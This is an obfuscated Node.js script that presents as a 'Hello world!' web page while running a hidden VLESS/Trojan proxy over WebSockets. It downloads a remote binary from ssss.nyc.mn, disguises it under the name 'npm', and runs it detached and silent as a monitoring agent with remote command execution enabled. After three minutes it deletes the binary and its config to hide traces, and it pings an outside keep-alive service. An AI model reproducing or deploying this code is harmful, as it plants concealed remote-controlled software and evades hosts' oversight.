const _0x1b2523=_0x5dad;function _0x2385(){const _0x10d269=['child_process','&fp=chrome&type=ws&host=','arch','once','catch','3673660WxAhRw','/bin/bash','get','\x20with\x20all\x20DNS\x20servers','trojan://','post','Status','readUInt16BE','replace','finish','386eKqhLs','2096','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','net','NEZHA_PORT','close','UUID','find','yulong.sbs','includes','127975kxcyQR','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','then','2044506cmIQYE','end','443','test','https://','https://amd64.ssss.nyc.mn/agent','sub','https://arm64.ssss.nyc.mn/agent','send','@cdns.doon.eu.org:443?security=tls&sni=','2087','text/plain','writeHead','writeFileSync','createWriteStream','cfbff0d1-9375-5685-968c-48ce8b15ae17','npm','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','Hello\x20world!','connection','chmod\x20+x\x20npm','pop','true','write','hex','unlink','SUB_PATH','8443','aarch64','9kaBeId','application/dns-json','setsid\x20nohup\x20./npm\x20-s\x20','log','env','message','2083','path','https://dns.google/resolve?name=','4738596NwUQFV','32QPgDTm','npm\x20is\x20already\x20running,\x20skip\x20running...','map','slice','&path=%2F','sha224','readUInt8','npm\x20download\x20successfully','from','&type=A','2032yoNizd','toString','type','length','https://amd64.ssss.nyc.mn/v1','Failed\x20to\x20resolve\x20','crypto','Server\x20is\x20running\x20on\x20port\x20','vless://','text/html','false','8711288WtaSLV','\x20-p\x20','NAME','https://oooo.serv00.net/add-url','update','1.1.1.1','npm\x20running\x20error:','join','connect','PORT','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','index.html','pipe','error','Answer','--tls','url','readFile','config.yaml','stream','5642763oVYdHO','WSPATH','concat','https://arm64.ssss.nyc.mn/v1','asOrganization','client_secret:\x20','npm\x20is\x20running','substr','split','createServer','utf8','base64','http','every'];_0x2385=function(){return _0x10d269;};return _0x2385();}(function(_0x296706,_0x59682f){const _0x224989=_0x5dad,_0x16746a=_0x296706();while(!![]){try{const _0x4f538c=parseInt(_0x224989(0x10f))/0x1*(-parseInt(_0x224989(0xd3))/0x2)+-parseInt(_0x224989(0x11c))/0x3+-parseInt(_0x224989(0xc9))/0x4*(-parseInt(_0x224989(0x119))/0x5)+-parseInt(_0x224989(0xc8))/0x6+parseInt(_0x224989(0xf2))/0x7+-parseInt(_0x224989(0xde))/0x8*(-parseInt(_0x224989(0xbf))/0x9)+parseInt(_0x224989(0x105))/0xa;if(_0x4f538c===_0x59682f)break;else _0x16746a['push'](_0x16746a['shift']());}catch(_0x2c080f){_0x16746a['push'](_0x16746a['shift']());}}}(_0x2385,0x93636));function _0x5dad(_0x58edad,_0x4ba9ea){const _0x2385b3=_0x2385();return _0x5dad=function(_0x5dad01,_0x3ecf8a){_0x5dad01=_0x5dad01-0xaa;let _0x3f9f6d=_0x2385b3[_0x5dad01];return _0x3f9f6d;},_0x5dad(_0x58edad,_0x4ba9ea);}const os=require('os'),http=require(_0x1b2523(0xfe)),fs=require('fs'),axios=require('axios'),net=require(_0x1b2523(0x112)),path=require(_0x1b2523(0xc6)),crypto=require(_0x1b2523(0xd9)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x1b2523(0x100)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x1b2523(0x115)]||_0x1b2523(0xb1),NEZHA_SERVER=process[_0x1b2523(0xc3)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x1b2523(0xc3)][_0x1b2523(0x113)]||'',NEZHA_KEY=process[_0x1b2523(0xc3)]['NEZHA_KEY']||'',DOMAIN=process['env']['DOMAIN']||_0x1b2523(0x117),AUTO_ACCESS=process[_0x1b2523(0xc3)]['AUTO_ACCESS']||![],WSPATH=process[_0x1b2523(0xc3)][_0x1b2523(0xf3)]||UUID[_0x1b2523(0xcc)](0x0,0x8),SUB_PATH=process['env'][_0x1b2523(0xbc)]||_0x1b2523(0x122),NAME=process[_0x1b2523(0xc3)][_0x1b2523(0xe0)]||'',PORT=process[_0x1b2523(0xc3)][_0x1b2523(0xe7)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x5aee68=_0x1b2523;try{const _0x28778f=await axios[_0x5aee68(0x107)]('https://speed.cloudflare.com/meta'),_0x3d0f5b=_0x28778f['data'];ISP=(_0x3d0f5b['country']+'-'+_0x3d0f5b[_0x5aee68(0xf6)])[_0x5aee68(0x10d)](/ /g,'_');}catch(_0x1a6dbc){ISP='Unknown';}};GetISP();const httpServer=http[_0x1b2523(0xfb)]((_0x3b3d9d,_0x18c5f4)=>{const _0x8af00f=_0x1b2523;if(_0x3b3d9d[_0x8af00f(0xee)]==='/'){const _0x33585d=path[_0x8af00f(0xe5)](__dirname,_0x8af00f(0xe9));fs[_0x8af00f(0xef)](_0x33585d,_0x8af00f(0xfc),(_0x5e63d1,_0x10a46d)=>{const _0x4b8f62=_0x8af00f;if(_0x5e63d1){_0x18c5f4[_0x4b8f62(0xae)](0xc8,{'Content-Type':_0x4b8f62(0xdc)}),_0x18c5f4[_0x4b8f62(0x11d)](_0x4b8f62(0xb4));return;}_0x18c5f4['writeHead'](0xc8,{'Content-Type':_0x4b8f62(0xdc)}),_0x18c5f4['end'](_0x10a46d);});return;}else{if(_0x3b3d9d[_0x8af00f(0xee)]==='/'+SUB_PATH){const _0x54643a=NAME?NAME+'-'+ISP:ISP,_0x2bbb98=_0x8af00f(0xdb)+UUID+'@cdns.doon.eu.org:443?encryption=none&security=tls&sni='+DOMAIN+_0x8af00f(0x101)+DOMAIN+_0x8af00f(0xcd)+WSPATH+'#'+_0x54643a,_0x18d275=_0x8af00f(0x109)+UUID+_0x8af00f(0xab)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x54643a,_0x80b47d=_0x2bbb98+'\x0a'+_0x18d275,_0x48dfa5=Buffer[_0x8af00f(0xd1)](_0x80b47d)['toString'](_0x8af00f(0xfd));_0x18c5f4[_0x8af00f(0xae)](0xc8,{'Content-Type':_0x8af00f(0xad)}),_0x18c5f4[_0x8af00f(0x11d)](_0x48dfa5+'\x0a');}else _0x18c5f4[_0x8af00f(0xae)](0x194,{'Content-Type':'text/plain'}),_0x18c5f4[_0x8af00f(0x11d)]('Not\x20Found\x0a');}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x1b2523(0x10d)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x1b2523(0xe3)];function resolveHost(_0xf20d4f){return new Promise((_0x5ac879,_0x175816)=>{const _0x3b3950=_0x5dad;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x3b3950(0x11f)](_0xf20d4f)){_0x5ac879(_0xf20d4f);return;}let _0x5b1cbf=0x0;function _0xab0bd7(){const _0x103961=_0x3b3950;if(_0x5b1cbf>=DNS_SERVERS['length']){_0x175816(new Error(_0x103961(0xd8)+_0xf20d4f+_0x103961(0x108)));return;}const _0x38c42e=DNS_SERVERS[_0x5b1cbf];_0x5b1cbf++;const _0x2c2475=_0x103961(0xc7)+encodeURIComponent(_0xf20d4f)+_0x103961(0xd2);axios[_0x103961(0x107)](_0x2c2475,{'timeout':0x1388,'headers':{'Accept':_0x103961(0xc0)}})[_0x103961(0x11b)](_0x4e733f=>{const _0x383467=_0x103961,_0x35c25e=_0x4e733f['data'];if(_0x35c25e[_0x383467(0x10b)]===0x0&&_0x35c25e['Answer']&&_0x35c25e[_0x383467(0xec)][_0x383467(0xd6)]>0x0){const _0x674ec5=_0x35c25e[_0x383467(0xec)][_0x383467(0x116)](_0x5f35b0=>_0x5f35b0[_0x383467(0xd5)]===0x1);if(_0x674ec5){_0x5ac879(_0x674ec5['data']);return;}}_0xab0bd7();})[_0x103961(0x104)](_0x15abdb=>{_0xab0bd7();});}_0xab0bd7();});}function handleVlessConnection(_0x1528a0,_0x49d55d){const _0x565713=_0x1b2523,[_0xb89286]=_0x49d55d,_0x5072fb=_0x49d55d[_0x565713(0xcc)](0x1,0x11);if(!_0x5072fb[_0x565713(0xff)]((_0x37879e,_0x49732a)=>_0x37879e==parseInt(uuid[_0x565713(0xf9)](_0x49732a*0x2,0x2),0x10)))return![];let _0x1b423a=_0x49d55d[_0x565713(0xcc)](0x11,0x12)[_0x565713(0xcf)]()+0x13;const _0x18557a=_0x49d55d[_0x565713(0xcc)](_0x1b423a,_0x1b423a+=0x2)[_0x565713(0x10c)](0x0),_0xc5f1e2=_0x49d55d[_0x565713(0xcc)](_0x1b423a,_0x1b423a+=0x1)['readUInt8'](),_0x3f0790=_0xc5f1e2==0x1?_0x49d55d['slice'](_0x1b423a,_0x1b423a+=0x4)[_0x565713(0xe5)]('.'):_0xc5f1e2==0x2?new TextDecoder()['decode'](_0x49d55d[_0x565713(0xcc)](_0x1b423a+0x1,_0x1b423a+=0x1+_0x49d55d[_0x565713(0xcc)](_0x1b423a,_0x1b423a+0x1)[_0x565713(0xcf)]())):_0xc5f1e2==0x3?_0x49d55d[_0x565713(0xcc)](_0x1b423a,_0x1b423a+=0x10)['reduce']((_0x5dfa72,_0x31a9ee,_0x4e54a2,_0xbec753)=>_0x4e54a2%0x2?_0x5dfa72[_0x565713(0xf4)](_0xbec753[_0x565713(0xcc)](_0x4e54a2-0x1,_0x4e54a2+0x1)):_0x5dfa72,[])['map'](_0x1df829=>_0x1df829['readUInt16BE'](0x0)[_0x565713(0xd4)](0x10))[_0x565713(0xe5)](':'):'';_0x1528a0[_0x565713(0xaa)](new Uint8Array([_0xb89286,0x0]));const _0x4ecbfd=createWebSocketStream(_0x1528a0);return resolveHost(_0x3f0790)[_0x565713(0x11b)](_0x3dd0fa=>{const _0x35333b=_0x565713;net['connect']({'host':_0x3dd0fa,'port':_0x18557a},function(){const _0x3a089d=_0x5dad;this[_0x3a089d(0xb9)](_0x49d55d[_0x3a089d(0xcc)](_0x1b423a)),_0x4ecbfd['on'](_0x3a089d(0xeb),()=>{})[_0x3a089d(0xea)](this)['on'](_0x3a089d(0xeb),()=>{})[_0x3a089d(0xea)](_0x4ecbfd);})['on'](_0x35333b(0xeb),()=>{});})['catch'](_0x5ecbaa=>{const _0x455222=_0x565713;net[_0x455222(0xe6)]({'host':_0x3f0790,'port':_0x18557a},function(){const _0x410e59=_0x455222;this[_0x410e59(0xb9)](_0x49d55d['slice'](_0x1b423a)),_0x4ecbfd['on'](_0x410e59(0xeb),()=>{})[_0x410e59(0xea)](this)['on'](_0x410e59(0xeb),()=>{})[_0x410e59(0xea)](_0x4ecbfd);})['on'](_0x455222(0xeb),()=>{});}),!![];}function handleTrojanConnection(_0x223822,_0x269fea){const _0x546cc8=_0x1b2523;try{if(_0x269fea[_0x546cc8(0xd6)]<0x3a)return![];const _0x37f17a=_0x269fea[_0x546cc8(0xcc)](0x0,0x38)[_0x546cc8(0xd4)](),_0x1159d6=[UUID];let _0x2e6b9b=null;for(const _0x1a56bd of _0x1159d6){const _0x250e26=crypto['createHash'](_0x546cc8(0xce))[_0x546cc8(0xe2)](_0x1a56bd)['digest'](_0x546cc8(0xba));if(_0x250e26===_0x37f17a){_0x2e6b9b=_0x1a56bd;break;}}if(!_0x2e6b9b)return![];let _0x2b52ac=0x38;_0x269fea[_0x2b52ac]===0xd&&_0x269fea[_0x2b52ac+0x1]===0xa&&(_0x2b52ac+=0x2);const _0x5d4198=_0x269fea[_0x2b52ac];if(_0x5d4198!==0x1)return![];_0x2b52ac+=0x1;const _0x2273e8=_0x269fea[_0x2b52ac];_0x2b52ac+=0x1;let _0x3b7794,_0x1d07f2;if(_0x2273e8===0x1)_0x3b7794=_0x269fea['slice'](_0x2b52ac,_0x2b52ac+0x4)['join']('.'),_0x2b52ac+=0x4;else{if(_0x2273e8===0x3){const _0x26905d=_0x269fea[_0x2b52ac];_0x2b52ac+=0x1,_0x3b7794=_0x269fea[_0x546cc8(0xcc)](_0x2b52ac,_0x2b52ac+_0x26905d)['toString'](),_0x2b52ac+=_0x26905d;}else{if(_0x2273e8===0x4)_0x3b7794=_0x269fea[_0x546cc8(0xcc)](_0x2b52ac,_0x2b52ac+0x10)['reduce']((_0x4f7400,_0x3c46f3,_0x27829e,_0x1b00f5)=>_0x27829e%0x2?_0x4f7400['concat'](_0x1b00f5['slice'](_0x27829e-0x1,_0x27829e+0x1)):_0x4f7400,[])[_0x546cc8(0xcb)](_0x26bd9c=>_0x26bd9c[_0x546cc8(0x10c)](0x0)[_0x546cc8(0xd4)](0x10))[_0x546cc8(0xe5)](':'),_0x2b52ac+=0x10;else return![];}}_0x1d07f2=_0x269fea[_0x546cc8(0x10c)](_0x2b52ac),_0x2b52ac+=0x2;_0x2b52ac<_0x269fea[_0x546cc8(0xd6)]&&_0x269fea[_0x2b52ac]===0xd&&_0x269fea[_0x2b52ac+0x1]===0xa&&(_0x2b52ac+=0x2);const _0x113901=createWebSocketStream(_0x223822);return resolveHost(_0x3b7794)[_0x546cc8(0x11b)](_0x1b84dc=>{const _0x284557=_0x546cc8;net[_0x284557(0xe6)]({'host':_0x1b84dc,'port':_0x1d07f2},function(){const _0x3b7e34=_0x284557;_0x2b52ac<_0x269fea[_0x3b7e34(0xd6)]&&this[_0x3b7e34(0xb9)](_0x269fea[_0x3b7e34(0xcc)](_0x2b52ac)),_0x113901['on'](_0x3b7e34(0xeb),()=>{})['pipe'](this)['on'](_0x3b7e34(0xeb),()=>{})['pipe'](_0x113901);})['on'](_0x284557(0xeb),()=>{});})[_0x546cc8(0x104)](_0x34e762=>{const _0x268f5e=_0x546cc8;net[_0x268f5e(0xe6)]({'host':_0x3b7794,'port':_0x1d07f2},function(){const _0x5584a3=_0x268f5e;_0x2b52ac<_0x269fea[_0x5584a3(0xd6)]&&this[_0x5584a3(0xb9)](_0x269fea['slice'](_0x2b52ac)),_0x113901['on'](_0x5584a3(0xeb),()=>{})[_0x5584a3(0xea)](this)['on'](_0x5584a3(0xeb),()=>{})[_0x5584a3(0xea)](_0x113901);})['on'](_0x268f5e(0xeb),()=>{});}),!![];}catch(_0xbb96bd){return![];}}wss['on'](_0x1b2523(0xb5),(_0x24b236,_0x19caff)=>{const _0x4f98d5=_0x1b2523,_0x2eba53=_0x19caff['url']||'';_0x24b236[_0x4f98d5(0x103)](_0x4f98d5(0xc4),_0x1d5137=>{const _0x24449a=_0x4f98d5;if(_0x1d5137['length']>0x11&&_0x1d5137[0x0]===0x0){const _0x32ffbb=_0x1d5137[_0x24449a(0xcc)](0x1,0x11),_0x559ee7=_0x32ffbb['every']((_0x24d674,_0x5f3c78)=>_0x24d674==parseInt(uuid[_0x24449a(0xf9)](_0x5f3c78*0x2,0x2),0x10));if(_0x559ee7){!handleVlessConnection(_0x24b236,_0x1d5137)&&_0x24b236[_0x24449a(0x114)]();return;}}!handleTrojanConnection(_0x24b236,_0x1d5137)&&_0x24b236[_0x24449a(0x114)]();})['on'](_0x4f98d5(0xeb),()=>{});});const getDownloadUrl=()=>{const _0x435a44=_0x1b2523,_0x10687b=os[_0x435a44(0x102)]();return _0x10687b==='arm'||_0x10687b==='arm64'||_0x10687b===_0x435a44(0xbe)?!NEZHA_PORT?_0x435a44(0xf5):_0x435a44(0x123):!NEZHA_PORT?_0x435a44(0xd7):_0x435a44(0x121);},downloadFile=async()=>{const _0x5f5858=_0x1b2523;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x43a488=getDownloadUrl(),_0x53c1f1=await axios({'method':_0x5f5858(0x107),'url':_0x43a488,'responseType':_0x5f5858(0xf1)}),_0x4a408e=fs[_0x5f5858(0xb0)](_0x5f5858(0xb2));return _0x53c1f1['data'][_0x5f5858(0xea)](_0x4a408e),new Promise((_0x2e6fc5,_0x22812d)=>{const _0xefa2c7=_0x5f5858;_0x4a408e['on'](_0xefa2c7(0x10e),()=>{const _0x5a2701=_0xefa2c7;console['log'](_0x5a2701(0xd0)),exec(_0x5a2701(0xb6),_0x57ea0f=>{if(_0x57ea0f)_0x22812d(_0x57ea0f);_0x2e6fc5();});}),_0x4a408e['on'](_0xefa2c7(0xeb),_0x22812d);});}catch(_0x4807a4){throw _0x4807a4;}},runnz=async()=>{const _0x1dae00=_0x1b2523;try{const _0x529b86=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(_0x529b86['trim']()!==''){console[_0x1dae00(0xc2)](_0x1dae00(0xca));return;}}catch(_0x39fc52){}await downloadFile();let _0x3a53f4='',_0x20cdda=[_0x1dae00(0x11e),_0x1dae00(0xbd),_0x1dae00(0x110),_0x1dae00(0xac),_0x1dae00(0xc5),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x471bbf=_0x20cdda[_0x1dae00(0x118)](NEZHA_PORT)?_0x1dae00(0xed):'';_0x3a53f4=_0x1dae00(0xc1)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1dae00(0xdf)+NEZHA_KEY+'\x20'+_0x471bbf+_0x1dae00(0x111);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x26f061=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x1dae00(0xfa)](':')[_0x1dae00(0xb7)]():'',_0x1859b6=_0x20cdda[_0x1dae00(0x118)](_0x26f061)?_0x1dae00(0xb8):_0x1dae00(0xdd),_0x2466e0=_0x1dae00(0xf7)+NEZHA_KEY+_0x1dae00(0x11a)+NEZHA_SERVER+_0x1dae00(0xe8)+_0x1859b6+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x1dae00(0xaf)]('config.yaml',_0x2466e0);}_0x3a53f4=_0x1dae00(0xb3);}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x3a53f4,{'shell':_0x1dae00(0x106)},_0x40aef6=>{const _0x4fe069=_0x1dae00;if(_0x40aef6)console['error'](_0x4fe069(0xe4),_0x40aef6);else console[_0x4fe069(0xc2)](_0x4fe069(0xf8));});}catch(_0x47dd89){console[_0x1dae00(0xeb)]('error:\x20'+_0x47dd89);}};async function addAccessTask(){const _0x2fc149=_0x1b2523;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5a8414=_0x2fc149(0x120)+DOMAIN+'/'+SUB_PATH;try{const _0x5a8422=await axios[_0x2fc149(0x10a)](_0x2fc149(0xe1),{'url':_0x5a8414},{'headers':{'Content-Type':'application/json'}});console[_0x2fc149(0xc2)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x4bb0d4){}}const delFiles=()=>{const _0x5f15d7=_0x1b2523;fs[_0x5f15d7(0xbb)](_0x5f15d7(0xb2),()=>{}),fs['unlink'](_0x5f15d7(0xf0),()=>{});};httpServer['listen'](PORT,()=>{const _0x4bb1ca=_0x1b2523;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x4bb1ca(0xc2)](_0x4bb1ca(0xda)+PORT);});
